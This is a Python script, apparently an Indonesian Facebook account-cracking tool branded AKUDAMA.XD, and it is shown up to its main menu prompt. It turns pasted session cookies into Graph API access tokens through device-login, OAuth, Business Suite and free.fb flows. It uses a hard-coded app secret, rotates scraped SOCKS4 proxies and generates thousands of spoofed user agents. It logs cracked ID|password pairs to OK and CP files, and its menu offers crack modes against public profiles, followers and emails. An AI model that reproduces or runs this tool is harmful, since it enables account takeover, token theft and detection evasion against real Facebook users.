import os, sys

try:
    import rich
except ImportError:
    print('\t• Modul Rich Proses •')
    os.system('pip install rich')

try:
    import stdiomask
except ImportError:
    print('\t• Modul Stdiomask Proses •')
    os.system('pip install stdiomask')

try:
    import requests
except ImportError:
    print('\t• Modul Requests Proses •')
    os.system('pip install requests && pip install mechanize')

try:
    import pysocks
except ImportError:
    print('\t• Modul PySocks Proses •')
    os.system('pip install pysocks')

import requests, bs4, json, random, datetime, time, re, urllib3, base64, uuid
import rich
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as parser
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as panel
from rich.progress import track
from time import sleep
from rich import print
from rich.panel import Panel
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich.tree import Tree
from rich import print as rprint
from rich import pretty
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn
from rich.text import Text as tekz

dump = []
memek = []
ualu, ualuh = [], []

from rich.console import Console
from rich.table import Table
from rich.columns import Columns
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TimeElapsedColumn

console = Console()
sys.stdout.write('\x1b]2; AKUDAMA.XD | EVANESCENCE \x07')

#------------------[ USER-AGENT ]-------------------#
pretty.install()
CON = sol()
ugen2 = []
ugen = []
cokbrut = []
dia = []
lisensikuni, lisensiku = [], []
ses = requests.Session()
princp = []
wa = Console()

try:
    prox = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=80000&country=all&ssl=all&anonymity=all', timeout=10).text
    open('.prox.txt', 'w').write(prox)
except:
    print('\n[!] Cek Koneksi Intermu')

prox = open('.prox.txt').read().splitlines() if os.path.exists('.prox.txt') else []

for xd in range(10000):
    a = random.choice(['3','4','5','6','7','8','9','10','11','12','13'])
    c = random.randrange(73,100)
    d = random.randrange(4200,4900)
    e = random.randrange(40,150)
    ugen2.append(f'Mozilla/5.0 (Linux; Android {a}; SAMSUNG SM-A305FN) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{c}.0.{d}.{e} Mobile Safari/537.36')

for meki in range(5000):
    negara = random.choice(["id_ID","en_US","en_GB","it_IT"])
    rr = random.randint
    raka1 = f"Mozilla/5.0 (Linux; U; Android 11; zh-CN; Redmi Note 8 Pro Build/RP1A.200720.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 UCBrowser/{str(rr(10,90))}.{str(rr(1,9))}.{str(rr(1,9))}.{str(rr(1000,1900))} Mobile Safari/537.36"
    raka2 = f"Mozilla/5.0 (Linux; Android {str(rr(5,12))}; SM-A125F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(40,113))}.0.{str(rr(4100,4900))}.{str(rr(40,113))} Mobile Safari/537.36 Instagram {str(rr(210,380))}.1.0.{str(rr(10,300))}.{str(rr(100,120))} Android (30/11; 300dpi; {str(rr(100,999))}x{str(rr(100,2000))}; samsung; SM-A125F; a12; mt6765; {negara}; 333717262)"
    nokiacoeg = "Mozilla/5.0 (Linux; U; Android 2.3.5; en-us; Karbonn A18+ Bulid/MocorDroid2.3.5) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.117 Mobile Safari/533.1 [FB_IAB/MESSENGER;FBAV/111.0.0.15.46;]"
    coegg = "Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36 NokiaBrowser/1.0.1.54"
    cogg = "Dalvik/2.1.0 (Android 9; L-03K Build/PKQ1.190522.001) [FBAN/MessengerLite;FBAV/141.0.0.2.117;FBPN/com.facebook.mlite;FBLC/en_US;FBBV/293513921;FBCR/Airtel;FBMF/Facebook;Facebook/lge;FBDV/L-03K;FBSV/9;FBCA"
    cogg3 = "Mozilla/5.0 (Android 9; HUAWEI BLA-L29) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36 SurfBrowser/3.0"
    cogg4 = "Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-A720F Build/R16NW) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/135374479;FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/(density=3.0,width=1080,height=1920);FB_FW/1;]"
    ugen.append(random.choice([raka1, raka2, nokiacoeg, coegg, cogg, cogg3, cogg4]))

for t in range(10000):
    m1 = 'Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-G770F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/20.0 Chrome/106.0.5249.126 Mobile Safari/537.36'
    m2 = 'Mozilla/5.0 (Linux; Android 13; SM-G770F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.122 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81;]'
    matahari10 = 'Mozilla/5.0 (Linux; U; Android 12; ru-ru; Redmi Note 10 Build/SKQ1.210908.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.116 Mobile Safari/537.36 XiaoMi/MiuiBrowser/12.22.0.3-gn'
    matahari11 = 'Mozilla/5.0 (iPhone; CPU iPhone OS 12_5_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/16H81 [FBAN/FBIOS;FBDV/iPhone6,1;FBMD/iPhone;FBSN/iOS;FBSV/12.5.7;FBSS/2;FBID/phone;FBLC/es_LA;FBOP/5]'
    matahari12 = 'Mozilla/5.0 (Linux; Android 13; SM-G770F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/407.0.0.30.97;]'
    matahari13 = 'Mozilla/5.0 (Linux; Android 7.1.1; SM-J250F Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/64.0.3282.137 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/394.1.0.51.107;]'
    matahari14 = 'Mozilla/5.0 (Linux; Android 7.1.1; SM-J250F Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.185 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/288.0.0.15.118;]'
    matahari15 = 'Mozilla/5.0 (Linux; Android 10; SM-G770F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.138 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/215.0.0.9.119;]'

    strvrun = random.randint
    uz1 = f"Mozilla/5.0 (Linux; Android {str(strvrun(1,5))}.1.1; SM-J111F Build/LMY47V; rv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Rocket/1.0.0.1 Chrome/{str(strvrun(10,55))}.0.2883.91 Mobile Safari/537.36"
    uz6 = f"Mozilla/5.0 (Linux; Android {str(strvrun(1,4))}.{str(strvrun(1,4))}.{str(strvrun(1,4))}; SM-J110H Build/KTU84P; pt-pt) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(strvrun(10,42))}.0.2311.135 Mobile Safari/537.36 Puffin/6.0.7.15747AP"
    uz3 = f"Mozilla/5.0 (Linux; Android {str(strvrun(8,11))}; M2102J20SG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(strvrun(50,111))}.0.0.0 Mobile Safari/537.36 EdgA/{str(strvrun(50,111))}.0.1661.{str(strvrun(10,59))} User Agent By Teddy Ganteng Sekali."
    uz5 = "Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Mobile Safari/537.36 OPR/61.2.3076.56749"
    ua4 = "Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5 Plus Build/OPM1.171019.019) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.61 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"

    aa = 'Mozilla/5.0 (Symbian/3; Series60/'
    wikwik = f'{aa}{random.randrange(1,9)}.{random.randrange(1,9)} Nokia{random.randrange(100,9999)}/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/{random.randrange(1,9)}.{random.randrange(1,4)}.{random.randrange(1,4)}.{random.randrange(1,4)} Mobile Safari/535.1'

    b2 = random.choice(['6','7','8','9','10','11','12'])
    d2 = random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZ')
    f2 = random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZ')
    ter = f'Mozilla/5.0 (Linux; U; Android {b2}; en-us; GT-{d2}{random.randrange(1,999)}{f2}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randrange(73,100)}.0.{random.randrange(4200,4900)}.{random.randrange(40,150)} Mobile Safari/537.36'

    a3 = random.choice(['3','4','5','6','7','8','9','10','11','12'])
    b3 = random.choice(['OPM1','TP1A','RP1A','PPR1','PKQ1','QP1A','SP1A','RKQ1'])
    c3 = random.randrange(111111,210000)
    d3 = random.randrange(11,19)
    e3 = random.randrange(73,100)
    f3 = random.randrange(4200,4900)
    g3 = random.randrange(40,150)
    random1 = random.choice(['SM-M236B','SM-A037G','SM-J701MT','SM-A115U','SM-G610M','SM-J530F','SM-A307FN','SM-A405FN'])
    bintang = f'Mozilla/5.0 (Linux; Android {a3}; {random1} Build/{b3}.{c3}.0{d3}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{e3}.0.{f3}.{g3} Mobile Safari/537.36'

    ugen.append(random.choice([m1, uz1, uz6, uz5, m2, bintang, matahari10, matahari11, matahari12, matahari13, ua4, matahari14, matahari15, ter, wikwik]))

for x in range(10):
    ugen2.append(f'Mozilla/5.0 (Linux; Android 9: zh-cn: Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randrange(100,9999)}/{random.randrange(100,9999)}{random.choice("ABCDEFGHIJKLMNOPQRSTUVWXYZ")}{random.randrange(1,9)}Linux; Android 9: zh-cn: Redmi 8A){random.randrange(1,9)}.{random.randrange(1,9)} Mobile Safari/E7FBAF')

def uaku():
    try:
        for ub in open('bbnew.txt').read().splitlines():
            ugen.append(ub)
    except:
        a = requests.get('https://github.com/EC-1709/a/blob/main/bbnew.txt').text
        ua = open('.bbnew.txt', 'w')
        for un in re.findall(r'line">(.*?)<', str(a)):
            ua.write(un + '\n')

###----------[ WARNA ]---------- ###
M2 = "[#FF0000]"
H2 = "[#00FF00]"
K2 = "[#FFFF00]"
B2 = "[#00C8FF]"
P2 = "[#FFFFFF]"

try:
    file_color = open("data/theme_color").read()
    color_text = file_color.split("|")[0]
    color_panel = file_color.split("|")[1]
except:
    color_text = "[#00C8FF]"
    color_panel = random.choice(["#00C8FF", "#FF0000", "#FFFF00", "#FFFFFF", "#00FF00"])

#------------[ INDICATION ]---------------#
id, id2, loop, ok, cp, akun, oprek, lisensiku, tokenku, uid, lisensikuni = [], [], 0, 0, 0, [], [], [], [], [], []
taplikasi = ['no']
method = []
pwpluss, pwnya = [], []
USE_PROXY = ['ya']
WORKER = [30]
DELAY = [0.0]

#------------[ WARNA-COLOR ]--------------#
P = '\x1b[0;37m'
M = '\x1b[0;31m'
H = '\x1b[0;32m'
K = '\x1b[0;33m'
B = '\x1b[1;94m'
N = '\x1b[0m'
x = '\33[m'
m = '\x1b[0;31m'
k = '\033[0;33m'
h = '\x1b[0;32m'
u = '\033[35m'
b = '\33[0;36m'

zam = '\033[0;32m[\033[0;37m➣\033[0;32m]\033[0;37m'
zam1 = '\033[0;32m[\033[0;37m1\033[0;32m]\033[0;37m'
zam2 = '\033[0;32m[\033[0;37m2\033[0;32m]\033[0;37m'
zam3 = '\033[0;32m[\033[0;37m3\033[0;32m]\033[0;37m'
zam4 = '\033[0;32m[\033[0;37m4\033[0;32m]\033[0;37m'
zam5 = '\033[0;32m[\033[0;37m5\033[0;32m]\033[0;37m'
zam6 = '\033[0;32m[\033[0;37m6\033[0;32m]\033[0;37m'
zam0 = '\033[0;32m[\033[0;37m0\033[0;32m]\033[0;37m'
plh = '\n\033[0;32m[\033[0;37m➣\033[0;32m]\033[0;37m Pilih '
plhh = '\n\033[0;32m[\033[0;37m➣\033[0;32m]\033[0;37m Pilih :\033[0;32m '
plhhh = '\n\033[0;32m[\033[0;37m➣\033[0;32m]\033[0;37m Cookie :\033[0;32m '
zam1v = '\033[0;32m[\033[0;37m1v/r\033[0;32m]\033[0;37m'
zam2v = '\033[0;32m[\033[0;37m2v/r\033[0;32m]\033[0;37m'
zam3v = '\033[0;32m[\033[0;37m3v/r\033[0;32m]\033[0;37m'

#--------------------[ CONVERTER-BULAN ]--------------#
dic = {'1':'Januari','2':'Februari','3':'Maret','4':'April','5':'Mei','6':'Juni','7':'Juli','8':'Agustus','9':'September','10':'Oktober','11':'November','12':'Desember'}
tgl = datetime.datetime.now().day
bln = dic[str(datetime.datetime.now().month)]
thn = datetime.datetime.now().year
okc = 'OK-' + str(tgl) + '-' + str(bln) + '-' + str(thn) + '.txt'
cpc = 'CP-' + str(tgl) + '-' + str(bln) + '-' + str(thn) + '.txt'

#------------------[ HELPER ]---------------#
def _ok(t):   console.print(f'[#00FF00][➣][/] {t}')
def _info(t): console.print(f'[#00C8FF][➣][/] {t}')
def _warn(t): console.print(f'[#FFFF00][!][/] {t}')
def _err(t):  console.print(f'[#FF0000][✗][/] {t}')

def _grab(pat, text, default=None):
    try:
        mm = re.search(pat, text)
        return mm.group(1) if mm else default
    except Exception:
        return default

def _ua_pick():
    try:
        return random.choice(ugen) if ugen else 'Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36'
    except Exception:
        return 'Mozilla/5.0'

def _proxy_pick():
    if USE_PROXY[0] != 'ya' or not prox:
        return None, '-'
    for _ in range(6):
        raw = random.choice(prox).strip()
        if not raw:
            continue
        if raw.startswith(('http://','https://','socks4://','socks5://')):
            url = raw
        elif raw.count(':') == 1:
            url = 'socks4://' + raw
        else:
            continue
        return {'http': url, 'https': url}, raw
    return None, '-'

def _new_session():
    s = requests.Session()
    s.headers.update({
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
        'upgrade-insecure-requests': '1',
        'user-agent': _ua_pick(),
    })
    return s

def _req(sess, method_, url, **kw):
    px, _ = _proxy_pick()
    kw.setdefault('timeout', 20)
    kw.setdefault('allow_redirects', True)
    try:
        if px:
            return getattr(sess, method_)(url, proxies=px, **kw)
        return getattr(sess, method_)(url, **kw)
    except requests.exceptions.ProxyError:
        return getattr(sess, method_)(url, **kw)

def _save_ok(idf, pw, ua):
    with open(f'OK/{okc}', 'a') as f:
        f.write(f'{idf}|{pw}|{ua}\n')

def _save_cp(idf, pw):
    with open(f'CP/{cpc}', 'a') as f:
        f.write(f'{idf}|{pw}\n')

#------------------[ MACHINE-SUPPORT ]---------------#
def clear(): os.system('clear')
def back():  login()

def alvino_xy(s):
    for e in s + "\n":
        sys.stdout.write(e); sys.stdout.flush(); time.sleep(0.005)

def haecerjoin_tm(s):
    for e in s + "\n":
        sys.stdout.write(e); sys.stdout.flush(); time.sleep(0.03)

#------------------[ LOGO ]-----------------#
LOGO = r"""
\033[0;37m┌════════════════════════════════════════┐
\033[0;32m█\t  __________       .__   \033[0;32m\t █
\033[0;32m█\t  \____    / _____ |  |  \033[0;32m\t █
\033[0;32m█\t    /     / /     \|  |  \033[0;32m\t █
\033[0;37m█\t   /     /_|  Y Y  \  |__\033[0;37m\t █
\033[0;37m█\t  /_______ \__|_|  /____/\033[0;37m\t █
\033[0;37m█\t          \/     \/      \033[0;37m\t █
\033[0;37m└════════════════════════════════════════┘      \n"""

def banner():
    os.system('clear')
    print(LOGO)

def logo():
    os.system('clear')
    print(LOGO + """
             \033[0;32m[ \033[0;37mMeki Berkuah \033[0;32m]
       \033[0;32m  [\033[0;37m Created By Zamxyz XD \033[0;32m]\033[0;37m\n""")

#--------------------[ BAGIAN-MASUK • FINAL ]--------------#
APP_ID      = '1348564698517390'
APP_SECRET  = '007c0a9101b9e1c8ffab727666805038'
APP_TOKEN   = APP_ID + '|' + APP_SECRET
APP_TOKEN_Q = APP_ID + '%7C' + APP_SECRET
BAPI_APP    = '350685531728'

METHODS = [
    ('1', 'device',   'Device Login  (Graph v2.6)', '#00FF00'),
    ('2', 'oauth',    'OAuth Dialog  (m.facebook)', '#00C8FF'),
    ('3', 'business', 'Business Suite  (EAAG)',     '#FFFF00'),
    ('4', 'freefb',   'Free Basics  (free.fb)',     '#FFA500'),
]

def _clean_cookie(raw):
    raw = raw.strip().strip('"').strip("'").replace('\n', '').replace('\r', '')
    if raw.lower().startswith('cookie:'):
        raw = raw[7:].strip()
    return raw

def _apply_cookie(sess, cookie):
    for part in cookie.split(';'):
        if '=' in part:
            kk_, vv_ = part.split('=', 1)
            kk_, vv_ = kk_.strip(), vv_.strip()
            if kk_:
                sess.cookies.set(kk_, vv_, domain='.facebook.com')

def _ask_password():
    try:
        return stdiomask.getpass(prompt=f'{zam} Password akun (Enter jika kosong) : ')
    except Exception:
        return input(f'{zam} Password akun (Enter jika kosong) : ')

def _invalid(html):
    return ('Bagaimana Anda ingin masuk ke Facebook?' in html
            or '/login/?next=' in html
            or ('name="email"' in html and 'name="pass"' in html and 'c_user' not in html))

def _submit_password(sess, url, html):
    pw = _ask_password()
    if not pw:
        return None
    data = {'lsd': _grab(r'name="lsd" value="(.*?)"', html, ''),
            'jazoest': _grab(r'name="jazoest" value="(\d+)"', html, ''),
            'pass': pw, 'flow': 'login_no_pin'}
    sess.headers.update({'content-type': 'application/x-www-form-urlencoded',
                         'origin': 'https://m.facebook.com', 'referer': url})
    r = _req(sess, 'post', url, data=data, timeout=25)
    sess.headers.pop('content-type', None)
    sess.headers.pop('origin', None)
    return r

def _login_head(proxy_raw, ua):
    os.system('clear')
    logo()
    console.print(panel(gp(
        tekz.from_markup('[#00FF00]COOKIE LOGIN MODULE[/]  [white]•[/]  [#FFFF00]MULTI METHOD[/]'),
        tekz.from_markup('[white]Paste cookie valid:[/] [#00FF00]c_user=...; xs=...[/]'),
        tekz.from_markup('[white]Proxy[/] [#00C8FF]{0}[/]   [white]UA[/] [#00C8FF]{1}[/]'.format(
            proxy_raw, (ua[:52] + '...') if len(ua) > 52 else ua)),
    ), title='[#00C8FF] AKUDAMA.XD [/]', border_style='#00FF00', padding=(1, 3)))

def _method_menu():
    tbl = Table(box=None, show_header=False, padding=(0, 2))
    tbl.add_column(style='bold #00FF00', width=4)
    tbl.add_column(style='#FFFFFF')
    for key, _, label, color in METHODS:
        tbl.add_row(key, tekz.from_markup(f'[{color}]{label}[/]'))
    tbl.add_row('0', '[#FF0000]Kembali[/]')
    console.print(panel(tbl, border_style='#00C8FF', title='[#00C8FF]METHOD[/]', padding=(0, 2)))

def login123():
    os.system('clear')
    banner()
    mulai()
    tbl = Table(box=None, show_header=False, padding=(0, 2))
    tbl.add_column(style='bold #00FF00', width=4)
    tbl.add_column(style='#FFFFFF')
    tbl.add_row('1', 'Login Cookie')
    tbl.add_row('2', 'Crack No Login')
    tbl.add_row('3', 'Cek Results')
    tbl.add_row('0', 'Keluar')
    console.print(panel(tbl, border_style='#00FF00', title='[#00C8FF]MENU[/]', padding=(0, 2)))
    zmeemk = input(f'{plhh}')
    if zmeemk in ['1', '01']:
        login_lagi334()
    elif zmeemk in ['2', '02']:
        lainnya()
    elif zmeemk in ['3', '03']:
        result()
    elif zmeemk in ['0']:
        exit()
    else:
        _warn('Pilih Yang Bener Tolol')
        time.sleep(3)
        back()

def login():
    try:
        token = open('akmd.txt').read().strip()
        cok = open('akmdx.txt').read().strip()
        tokenku.append(token)
        try:
            s = _new_session()
            _apply_cookie(s, cok)
            sy = s.get('https://graph.facebook.com/me?fields=id,name&access_token=' + token, timeout=15)
            menu(sy.json()['name'], sy.json()['id'])
        except KeyError:
            login123()
        except requests.exceptions.ConnectionError:
            sol().print(mark(' \tTidak Bisa Masuk Tod, Cek Koneksi Ente', style='red'), style='cyan')
            exit()
    except OSError:
        login123()

def login_lagi334(attempt=1):
    if attempt > 15:
        _err('Batas percobaan habis, restart manual.')
        time.sleep(3)
        if os.path.exists('2.1.py'):
            os.system(f'{sys.executable} 2.1.py')
        return

    proxy, proxy_raw = _proxy_pick()
    ua = _ua_pick()
    _login_head(proxy_raw, ua)
    _info(f'Percobaan ke-{attempt}')
    _method_menu()

    mm = (input(f'{plhh}') or '1').strip()
    if mm in ['0', '00']:
        return back()
    met = next((v for k_, v, _, _ in METHODS if k_ == mm), 'device')
    label = next((l for k_, v, l, _ in METHODS if v == met), met)
    _info(f'Method : {label}')

    cookie = _clean_cookie(input(f'{plhhh}'))
    if 'c_user=' not in cookie:
        _warn('Cookie tidak mengandung c_user, coba lagi.')
        time.sleep(1.5)
        return login_lagi334(attempt + 1)

    sess = _new_session()
    sess.headers['user-agent'] = ua
    if proxy:
        sess.proxies.update(proxy)
    _apply_cookie(sess, cookie)

    try:
        if met == 'device':
            token = _login_device(sess, cookie, ua)
        elif met == 'oauth':
            token = _login_oauth(sess, cookie, ua)
        elif met == 'business':
            token = _login_business(sess, cookie, ua)
        else:
            token = _login_freefb(sess, cookie, ua)
    except requests.exceptions.ProxyError:
        _err('Proxy mati, ganti otomatis...')
        time.sleep(1.2)
        return login_lagi334(attempt + 1)
    except requests.exceptions.ConnectionError:
        _err('Koneksi putus, cek internet / proxy.')
        time.sleep(1.5)
        return login_lagi334(attempt + 1)
    except Exception as e:
        _err(f'Tumbal Mokad : {type(e).__name__}')
        time.sleep(1)
        return login_lagi334(attempt + 1)

    if not token:
        _err('Cookie Invalid / Expired, ambil cookie fresh.')
        for f_ in ('akmd.txt', 'akmdx.txt'):
            if os.path.exists(f_):
                os.remove(f_)
        time.sleep(2)
        return login_lagi334(attempt + 1)

    try:
        who = sess.get('https://graph.facebook.com/me?fields=id,name&access_token=' + token, timeout=15).json()
        nm, uid_ = who['name'], who['id']
    except Exception:
        nm, uid_ = 'Unknown', '0'

    open('akmd.txt', 'w').write(token)
    open('akmdx.txt', 'w').write(cookie)

    console.print(panel(gp(
        tekz.from_markup(f'[#00FF00]Login Berhasil[/]  [#FFFFFF]{nm}[/] [white]([/][#00C8FF]{uid_}[/][white])[/]'),
        tekz.from_markup(f'[white]Token :[/] [#FFFF00]{token}[/]'),
        tekz.from_markup(f'[white]Method:[/] {label}   [white]Proxy:[/] {proxy_raw}'),
        tekz.from_markup('[white]File  :[/] akmd.txt , akmdx.txt'),
    ), title='[#00C8FF]SUKSES[/]', border_style='#00FF00', padding=(1, 3)))

    time.sleep(1)
    if os.path.exists('2.1.py'):
        os.system(f'{sys.executable} 2.1.py')

def _login_device(sess, cookie, ua):
    sess.headers['content-type'] = 'application/x-www-form-urlencoded'
    js = sess.post('https://graph.facebook.com/v2.6/device/login/',
                   data={'access_token': APP_TOKEN, 'scope': ''}, timeout=20).json()
    code, user_code = js['code'], js['user_code']
    verify_url = f'https://m.facebook.com/device?user_code={user_code}'
    status_url = ('https://graph.facebook.com/v2.6/device/login_status?method=post&code='
                  + code + '&access_token=' + APP_TOKEN_Q + '&callback=LeetsharesCallback')

    sess.headers.pop('content-type', None)
    sess.headers.update({'sec-fetch-mode': 'navigate', 'sec-fetch-site': 'cross-site',
                         'Host': 'm.facebook.com', 'referer': 'https://graph.facebook.com/',
                         'sec-fetch-dest': 'document'})
    r = _req(sess, 'get', verify_url, timeout=25)
    if _invalid(r.text):
        return None

    action = _grab(r'action="(.*?)">', r.text)
    if not action:
        return None
    data = {'fb_dtsg': _grab(r'name="fb_dtsg" value="(.*?)"', r.text, ''),
            'jazoest': _grab(r'name="jazoest" value="(\d+)"', r.text, ''),
            'qr': 0, 'user_code': user_code}

    sess.headers.update({'origin': 'https://m.facebook.com', 'referer': verify_url,
                         'content-type': 'application/x-www-form-urlencoded',
                         'sec-fetch-site': 'same-origin'})
    r3 = _req(sess, 'post', 'https://m.facebook.com' + action.replace('amp;', ''), data=data, timeout=25)

    if '/login/device-based/password' in r3.url or 'name="pass"' in r3.text:
        rp = _submit_password(sess, r3.url, r3.text)
        if rp is not None:
            r3 = rp

    if 'auth_type=rerequest' in str(r3.url):
        sess.headers.pop('content-type', None)
        sess.headers.pop('origin', None)
        r4 = _req(sess, 'post', r3.url, data=data, timeout=25).text
        action = _grab(r'action="(.*?)"', r4)
        if not action:
            return None
        data = {'fb_dtsg': _grab(r'name="fb_dtsg" value="(.*?)"', r4, ''),
                'jazoest': _grab(r'name="jazoest" value="(\d+)"', r4, ''),
                'scope': _grab(r'name="scope" value="(.*?)"', r4, ''),
                'display': _grab(r'name="display" value="(.*?)"', r4, ''),
                'user_code': _grab(r'name="user_code" value="(.*?)"', r4, ''),
                'logger_id': _grab(r'name="logger_id" value="(.*?)"', r4, ''),
                'auth_type': _grab(r'name="auth_type" value="(.*?)"', r4, ''),
                'encrypted_post_body': _grab(r'name="encrypted_post_body" value="(.*?)"', r4, ''),
                'return_format[]': _grab(r'name="return_format\[\]" value="(.*?)"', r4, '')}
        sess.headers.update({'origin': 'https://m.facebook.com', 'referer': r3.url,
                             'content-type': 'application/x-www-form-urlencoded'})
        r5 = _req(sess, 'post', 'https://m.facebook.com' + action.replace('amp;', ''), data=data, timeout=25).text
        redirect = _grab(r'window.location.href="(.*?)"', r5)
        if not redirect:
            return None
        sess.headers.pop('content-type', None)
        sess.headers.pop('origin', None)
        sess.headers['referer'] = 'https://m.facebook.com/'
        r6 = _req(sess, 'get', redirect.replace('\\', ''), timeout=25).text
        if 'Sukses' not in r6:
            return None
    else:
        redirect = _grab(r'window.location.href="(.*?)"', r3.text)
        if redirect:
            sess.headers.pop('content-type', None)
            sess.headers['referer'] = 'https://m.facebook.com/'
            _req(sess, 'get', redirect.replace('\\', ''), timeout=25)

    sess.headers.update({'sec-fetch-mode': 'no-cors', 'referer': 'https://graph.facebook.com/',
                         'Host': 'graph.facebook.com', 'accept': '*/*',
                         'sec-fetch-dest': 'script', 'sec-fetch-site': 'cross-site'})
    r7 = _req(sess, 'get', status_url, timeout=20).text
    return _grab(r'"access_token": "(.*?)"', r7)

def _login_oauth(sess, cookie, ua):
    url = ('https://m.facebook.com/dialog/oauth/?client_id=' + APP_ID
           + '&redirect_uri=https%3A%2F%2Fwww.facebook.com%2Fconnect%2Flogin_success.html'
           + '&response_type=token&scope=&auth_type=rerequest&display=touch')
    r = _req(sess, 'get', url, timeout=25)
    if _invalid(r.text):
        return None
    if 'name="pass"' in r.text:
        rp = _submit_password(sess, r.url, r.text)
        if rp is not None:
            r = rp
    return (_grab(r'access_token=(EAA[A-Za-z0-9]+)', r.url)
            or _grab(r'access_token=(EAA[A-Za-z0-9]+)', r.text)
            or _grab(r'"access_token":\s*"(.*?)"', r.text))

def _login_business(sess, cookie, ua):
    sess.headers['user-agent'] = ('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 '
                                  '(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36')
    r = _req(sess, 'get', 'https://business.facebook.com/business_locations', timeout=30)
    return (_grab(r'"(EAA[A-Za-z0-9]{40,})"', r.text)
            or _grab(r'access_token=(EAA[A-Za-z0-9]+)', r.text)
            or _grab(r'(EAA[A-Za-z0-9]{60,})', r.text))

def _login_freefb(sess, cookie, ua):
    for host in ('free.facebook.com', 'm.facebook.com'):
        try:
            url = ('https://' + host + '/dialog/oauth/?client_id=' + APP_ID
                   + '&redirect_uri=https%3A%2F%2Fwww.facebook.com%2Fconnect%2Flogin_success.html'
                   + '&response_type=token&scope=&auth_type=rerequest')
            r = _req(sess, 'get', url, timeout=25)
            if 'name="pass"' in r.text:
                rp = _submit_password(sess, r.url, r.text)
                if rp is not None:
                    r = rp
            tok = (_grab(r'access_token=(EAA[A-Za-z0-9]+)', r.url)
                   or _grab(r'access_token=(EAA[A-Za-z0-9]+)', r.text))
            if tok:
                return tok
        except Exception:
            continue
    return None

def mulai():
    os.system('clear')
    banner()
    print(f"{zam} Author   :{h} ZAMXYZ XD \n{zam} Github   :{h} github.com/zamxyz\n{zam} Facebook : {h}100000464945488\n{zam} Telegram : {h}PANTAD_BABI_BERSINAR\n")

#------------------[ BAGIAN-MENU ]----------------#
def menu(my_name, my_id):
    try:
        token = open('akmd.txt').read()
        cok = open('akmdx.txt').read()
    except OSError:
        print(f'{zam} Cookies Kadaluarsa ')
        time.sleep(5)
        login()
    os.system('clear')
    banner()
    console.print(panel(gp(
        tekz.from_markup(f'[white]Username[/] [#00FF00]{my_name}[/]'),
        tekz.from_markup(f'[white]User Idz[/] [#00FF00]{my_id}[/]'),
        tekz.from_markup(f'[white]Proxy[/] [#00C8FF]{USE_PROXY[0]}[/] [white]•[/] [white]Worker[/] [#00C8FF]{WORKER[0]}[/]'),
    ), title='[#00C8FF] AKUN [/]', border_style='#00FF00', padding=(0, 2)))
    print(f"{zam1} Crack Publik \n{zam2} Crack Pengikut \n{zam3} Cek Results\n{zam4} Crack Email\n{zam0} Keluar")
    kamu_nanya = input(f'{plhh}')
